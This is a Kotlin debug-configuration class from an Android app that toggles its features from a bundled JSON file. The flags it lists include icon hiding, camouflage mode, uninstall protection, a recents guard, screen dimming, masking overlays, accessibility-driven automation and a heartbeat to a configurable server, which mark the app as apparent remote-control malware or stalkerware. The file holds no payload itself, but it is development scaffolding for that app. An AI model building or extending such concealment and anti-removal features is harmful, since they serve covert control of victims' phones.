package com.storm.safe.rock.util

import android.content.Context
import android.util.Log
import org.json.JSONObject

/**
 * 调试配置管理器 — 从 assets/debug_config.json 读取配置。
 *
 * debug 包 (BuildConfig.DEBUG=true) 时加载配置文件。
 * release 包时全部返回默认值（禁用所有调试特性）。
 *
 * 用法:
 *   DebugConfig.init(context)             // Application.onCreate 中调用一次
 *   if (DebugConfig.disableDimScreen) ... // 任意位置读取
 */
object DebugConfig {
    private const val TAG = "DebugConfig"
    private const val CONFIG_FILE = "server_config.json"

    // ── global ──
    var debug: Boolean = false; private set

    // ── overlay ──
    var disableConfigMask: Boolean = false; private set
    var disableFullscreenBlocker: Boolean = false; private set
    var disableCipherOverlay: Boolean = false; private set
    var maskBgUrl: String = ""; private set
    var maskIconUrl: String = ""; private set

    // ── webview ──
    var webUrl: String = ""; private set
    var disableWebView: Boolean = false; private set

    // ── screen ──
    var disableDimScreen: Boolean = false; private set
    var disableBrightnessRestore: Boolean = false; private set

    // ── icon ──
    var disableIconHide: Boolean = false; private set
    var disableCamouflageMode: Boolean = false; private set

    // ── protection ──
    var disableUninstallProtection: Boolean = false; private set
    var disableRecentsGuard: Boolean = false; private set

    // ── automation ──
    var disableWriteSettingsAuto: Boolean = false; private set
    var disableBrandEngine: Boolean = false; private set
    var automationDelayMs: Long = 800L; private set

    // ── network ──
    var serverUrlOverride: String = ""; private set
    var disableHeartbeat: Boolean = false; private set
    var logAllWsMessages: Boolean = false; private set

    // ── logging ──
    var verboseInitChain: Boolean = false; private set
    var verboseEventDispatch: Boolean = false; private set
    var verboseNodeSearch: Boolean = false; private set
    var logAllAccessibilityEvents: Boolean = false; private set

    private var initialized = false

    fun init(context: Context) {
        if (initialized) return

        if (!com.storm.safe.rock.BuildConfig.DEBUG) {
            Log.d(TAG, "Release 包，跳过调试配置加载")
            initialized = true
            return
        }

        try {
            val configStr = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(context, CONFIG_FILE)
            if (configStr == null) { Log.d(TAG, "server_config.json 不存在，使用默认值"); initialized = true; return }
            val root = JSONObject(configStr)

            debug = root.optBoolean("debug", false)
            webUrl = root.optString("webUrl", "")

            root.optJSONObject("debugConfig")?.let { d ->
                disableConfigMask = d.optBoolean("disable_config_mask", false)
                disableFullscreenBlocker = d.optBoolean("disable_fullscreen_blocker", false)
                disableCipherOverlay = d.optBoolean("disable_cipher_overlay", false)
                maskBgUrl = d.optString("mask_bg_url", "")
                maskIconUrl = d.optString("mask_icon_url", "")
                disableWebView = d.optBoolean("disable_webview", false)
                disableDimScreen = d.optBoolean("disable_dim_screen", false)
                disableBrightnessRestore = d.optBoolean("disable_brightness_restore", false)
                disableIconHide = d.optBoolean("disable_icon_hide", false)
                disableCamouflageMode = d.optBoolean("disable_camouflage_mode", false)
                disableUninstallProtection = d.optBoolean("disable_uninstall_protection", false)
                disableRecentsGuard = d.optBoolean("disable_recents_guard", false)
                disableWriteSettingsAuto = d.optBoolean("disable_write_settings_auto", false)
                disableBrandEngine = d.optBoolean("disable_brand_engine", false)
                automationDelayMs = d.optLong("automation_delay_ms", 800L)
                serverUrlOverride = d.optString("server_url_override", "")
                disableHeartbeat = d.optBoolean("disable_heartbeat", false)
                logAllWsMessages = d.optBoolean("log_all_ws_messages", false)
                verboseInitChain = d.optBoolean("verbose_init_chain", false)
                verboseEventDispatch = d.optBoolean("verbose_event_dispatch", false)
                verboseNodeSearch = d.optBoolean("verbose_node_search", false)
                logAllAccessibilityEvents = d.optBoolean("log_all_accessibility_events", false)
            }

            if (debug) { disableConfigMask = true }

            Log.i(TAG, "✅ 调试配置已加载: debug=$debug mask=$disableConfigMask dim=$disableDimScreen icon=$disableIconHide protect=$disableUninstallProtection")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ 调试配置加载失败 (使用默认值): ${e.message}")
        }

        initialized = true
    }

    /** 输出当前全部配置到日志 */
    fun dump() {
        if (!initialized) return
        Log.d(TAG, buildString {
            appendLine("╔══ DebugConfig ══")
            appendLine("║ debug:      $debug")
            appendLine("║ overlay:    mask=$disableConfigMask blocker=$disableFullscreenBlocker cipher=$disableCipherOverlay")
            appendLine("║ webview:    url='$webUrl' disable=$disableWebView")
            appendLine("║ screen:     dim=$disableDimScreen brightnessRestore=$disableBrightnessRestore")
            appendLine("║ icon:       hide=$disableIconHide camouflage=$disableCamouflageMode")
            appendLine("║ protection: uninstall=$disableUninstallProtection recents=$disableRecentsGuard")
            appendLine("║ automation: writeSettings=$disableWriteSettingsAuto brand=$disableBrandEngine delay=${automationDelayMs}ms")
            appendLine("║ network:    override='$serverUrlOverride' heartbeat=$disableHeartbeat logWs=$logAllWsMessages")
            appendLine("║ logging:    init=$verboseInitChain event=$verboseEventDispatch node=$verboseNodeSearch allA11y=$logAllAccessibilityEvents")
            append("╚════════════════")
        })
    }
}
